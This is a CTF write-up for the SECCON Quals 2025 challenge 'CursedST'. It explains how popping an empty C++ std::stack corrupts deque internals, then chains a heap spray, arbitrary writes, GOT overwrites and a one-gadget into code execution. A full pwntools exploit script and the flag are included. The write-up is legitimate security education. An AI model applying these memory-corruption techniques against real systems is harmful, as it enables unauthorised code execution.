---
date: '2025-12-17T09:00:00Z'
draft: false
title: 'Seccon Quals 2025 - CursedST'
summary: "Pop on an empty std::stack?!"

categories: ["Writeups"]
tags: [ "heap", "c++"]
author: "leo_something & Lotus"
ShowToc: true
---

## Overview
The challenge consists in a simple C++ binary that let's you push and pop `unsigned long`s on two `std::stack`s named `S` and `T`. At startup you can also provide a name that is then printed (this will be useful to leak).
```cpp
#include <iostream>
#include <stack>

std::string name;
std::stack<size_t> S, T;

int main() {
  size_t op, val;

  std::cout << "What's your name?" << std::endl;
  std::cin >> name;
  std::cout << "Hello, " << name << "!" << std::endl;

  while (std::cin.good()) {
    std::cin >> op;
    if (op == 1) {
      std::cin >> val;
      S.push(val);
    } else if (op == 2) {
      S.pop();
    } else if (op == 3) {
      std::cin >> val;
      T.push(val);
    } else if (op == 4) {
      T.pop();
    } else {
      break;
    }
  }

  return 0;
}
```

## Vulnerability
We can pop even if a stack is empty. To exploit this we need to deep dive into how a `std::stack` is implemented.
```c
struct stack // sizeof=0x50
{
    void **_M_map;
    size_t _M_map_size;
    struct iterator _M_start;
    struct iterator _M_finish;
};

struct iterator // sizeof=0x20
{   
    void *_M_cur;
    void *_M_first;
    void *_M_last;
    void **_M_node;
};
```
Things to notice:
1. Nodes are arrays of size 0x200 that contain the actual data you push on the stack
2. There are two iterators because a `std::stack` is basically a `std::deque`. `_M_start` doesn't usually move (we didn't actually deep dive into that tho) and `_M_finish` is the actual cursor that keeps track of the top of the stack.
3. `_M_node` points at the node pointer inside `_M_map`
4. `_M_map` is a dynamic array of node pointers
	1. The first node pointer is put at the center of the map (probably useful for deques)
	2. If a node is full, another one gets allocated and the pointer put after the last one in the map
	3. If a node is empty it's freed and the current node becomes the previous one
	4. If a map is full (<2 slots remaining) it's reallocated

If we pop stuff from an empty stack we trigger point `4.3` in the list above, but as there are no previous nodes in the map, the finish iterator will then point to whatever value is present in the map before the pointer to the first node. That value is usually zero, so if we try to push or pop more stuff in that stack the program crashes.

## Exploitation
**NOTE:** The program is compiled with `Partial RELRO` and `No PIE`.

To exploit this vulnerability we need to somehow put a valid pointer in the map.
The name is a `std::string`, this object is constantly reallocated when more data is put into it. This implies that if we send a huge name we will trigger some frees on chunks containing our data. In this way we can spray the heap with pointers, when a big chunk containing part of our name (pointers) gets freed it is put into the unsorted bin free-list, so we can trigger the reallocation of the map and have it allocated from the unsorted bin, keeping the memory inside it uninitialized.
With this trick we can control a node pointer and achieve one write to an arbitrary location.
We can use this write to override the `_M_finish` struct of the other stack, achieving finally arbitrary write.

With the arbitrary write we change the pointer to the string stored inside `name`, to make it point at the GOT entry of `__cxa_atexit` (which contains a libc pointer). 
Now we override the GOT entry of `operator delete[]` to make it point to `main+95` (which is where the name is printed). `operator delete[]` is called inside the exit handlers so, upon exit, the program restarts and we get a libc leak. Now we can override the GOT entry of `std::basic_istream` with a one-gadget and get RCE.

### Final Exploit
```py
#!/bin/env python3

import sys
from pwn import context, ELF, args, remote, process, gdb, p64, info, success, u64, pause

#
# INIT
#
context.terminal = ["alacritty", "--working-directory", "./", "-e"]
elf = context.binary = ELF("./st_patched", False)
libc = ELF("./libs/libc.so.6", False)
libcpp = ELF("./libs/libstdc++.so.6", False)
gs = """
    continue
    """

def start(argv):
    if args.REMOTE:
        if len(argv) != 2:
            print(f"Usage:\t{argv[0]} <IP>:<PORT> REMOTE")
            exit(-1)
        (IP, PORT) = argv[1].split(":")
        return remote(IP, int(PORT))
    elif args.GDB:
        return gdb.debug(elf.path, gs, aslr=True)
    else:
        return process(elf.path)

#
# UTILS
#
ONE_GADGET = 0x583f3

#
# FUNCTIONS
#
def s_push(val):
    io.sendline(b"1")
    io.sendline(str(val).encode())

def s_pop():
    io.sendline(b"2")

def t_push(val):
    io.sendline(b"3")
    io.sendline(str(val).encode())

def t_pop():
    io.sendline(b"4")

#
# EXPLOIT
#
def main(argv):
    global io
    io = start(argv)

    # heap spray
    name = p64(elf.sym["T"]) * 0x100
    io.sendlineafter(b"?\n", name)

    for _ in range(5):
        for i in range(64):
            s_push(0xdeadbeefcafe0000 + 0x30 + i)

    for _ in range(5):
        for i in range(64):
            s_pop()

    # Now S.finish points to T
    s_pop()

    # Getting curr on top of T
    for _ in range(57):
        s_pop()

    info(f"Target __cxa_atexit: {hex(elf.got['__cxa_atexit'])}")
    # T.finish.cur
    s_push(elf.got['__cxa_atexit']+0x20) # operator delete
    # T.finish.first
    s_push(elf.got['__cxa_atexit']-0x20)
    # T.finish.last
    s_push(elf.got['__cxa_atexit']-0x20+0x1000)

    # Overwrite __cxa_atexit
    t_push(elf.sym["main"]+95)

    # Overlap T with name
    for _ in range(3):
        s_pop()
    s_push(elf.sym["_Z4nameB5cxx11"])

    # Overwrite name
    t_push(elf.got['__cxa_atexit'])

    io.sendline(b"0")

    io.recvuntil(b"Hello, ")
    io.recvuntil(b"Hello, ")
    libc_leak = u64(io.recv(8))
    success(f"libc leak: {hex(libc_leak)}")
    libc.address = libc_leak - 0x471f0

    s_pop()

    # T.finish.cur
    s_push(elf.got['__cxa_atexit']+0x48) # ios_good
    # T.finish.first
    s_push(elf.got['__cxa_atexit']-0x20)
    # T.finish.last
    s_push(elf.got['__cxa_atexit']-0x20+0x1000)

    for i in range(9):
        s_pop()

    s_push(0)

    t_push(libc.address + ONE_GADGET)

	io.interactive()


if __name__ == "__main__":
    sys.exit(main(sys.argv))
```
**FLAG:** `SECCON{y0u_uNd3Rs74nd_H0w_t0_3xpLo1t_tH3_"stack"}`
